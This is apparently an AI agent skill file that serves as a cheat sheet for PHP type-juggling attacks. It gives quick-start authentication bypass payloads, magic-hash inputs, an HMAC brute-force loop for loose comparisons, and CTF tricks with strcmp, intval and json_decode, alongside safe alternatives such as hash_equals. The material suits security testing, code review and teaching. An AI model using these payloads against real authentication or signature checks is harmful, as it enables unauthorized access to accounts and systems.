---
name: type-juggling
description: >-
  PHP type juggling and weak comparison (==) bypass. Use when authentication, HMAC/signature checks, or token validation uses loose equality, numeric coercion, or hash comparisons without strict types.
---

# SKILL: PHP Type Juggling

> **AI LOAD INSTRUCTION**: PHP `==` coercion, magic hashes (`0e...`), HMAC loose checks, NULL from bad types, and CTF-style `strcmp`/`json_decode`/`intval` tricks.

## 0. QUICK START

First-pass payloads:
```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

| Clue | Next step |
|---|---|
| Source uses `==` to compare passwords/tokens/HMAC | Sections 1-3 |
| `md5($a) == md5($b)` | Section 2 magic hashes |
| `hash_hmac(...) != '0'` | Section 3 |
| `strcmp`, `json_decode`, `intval` | Section 5 |

---

## 1. LOOSE COMPARISON (`==`) TRUTH TABLE

| Expression | Result | PHP Note |
|---|---|---|
| `'0e462...' == '0e830...'` | **true** | Both parse as 0.0 scientific notation |
| `'123a' == 123` | **true** | String cast to int stops at first non-digit |
| `'abc' == 0` | **true** (PHP 7.x), **false** (PHP 8+) | Non-numeric string vs int |
| `'' == 0` | **true** | Empty string -> 0 |
| `false == NULL` | **true** | loose equality |
| `'0' == false` | **true** | `'0'` is the only non-empty string falsy to bool |

**Key**: always note PHP version -- PHP 8 fixed the `0 == "foo"` case.

### Safe alternative
```php
hash_equals((string)$expected, (string)$actual);
$expected === $actual;
```

---

## 2. MAGIC HASHES (`0e...` + digits only)

When hash digests match `^0e[0-9]+$`, PHP treats them as floats (0.0 == 0.0).

| Algorithm | Input | Digest |
|---|---|---|
| MD5 | `240610708` | `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| SHA-1 | `10932435112` | `0e07766915004133176347055865026311692244` |

```text
?a=240610708&b=QNKCDZO
# md5(a) == md5(b) -> true (both 0.0)
```

---

## 3. HMAC BYPASS (LOOSE COMPARE VS 0)

If code uses `hash_hmac('md5', $data, $key) != '0'`: brute-force `$data` until output matches `^0e[0-9]+$`.

```text
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use t
```

**Mitigation**: `hash_equals($mac, $expected)` + never compare HMAC to `"0"`.

---

## 4. NULL JUGGLING (ARRAYS & TYPE ERRORS)

```php
@sha1($_GET['x']) == @sha1($_GET['y']);  // both error to NULL -> NULL == NULL -> true
```

Look for `@`, custom `try/catch` setting hash to null, or user input where string required.

---

## 5. CTF PATTERNS

```php
// strcmp with array
strcmp([], "password");  // NULL in PHP 7/8
// NULL == 0 -> true in loose compare
// Payload: ?p[]=1

// intval bypass
intval("0x1A", 0);    // -> 26
intval("010", 0);     // -> 8 (octal)
intval((float)"1e2"); // -> 100
// Payloads: ?id=0x1A, ?id=010, ?id=1e2

// json_decode + true
// {"password": true}
$j = json_decode($input, true);
if ($j['password'] == $stored_string) // true == "nonempty" -> true

// is_numeric + loose compare
is_numeric("0e12345");  // true
"0e12345" == 0;         // true
```

---

## 6. DECISION TREE

```
PHP loose compare / hash == hash?
|
|-- Uses === or hash_equals? -> STOP (likely safe)
|
|-- Uses == or strcmp == 0?
|   |-- Both hash digests match ^0e\d+? -> Magic hash collision
|   |-- One int + one string? -> String/int juggling
|   |-- HMAC vs "0"? -> Brute data for 0e digest
|   |-- Arrays / json true / strcmp([])? -> NULL juggling
```

| Tool | Use |
|---|---|
| Local `php` CLI | Reproduce `==` behavior for target PHP version |
| Static code review | Grep `==`, `!=` on crypto outputs; find missing `hash_equals` |
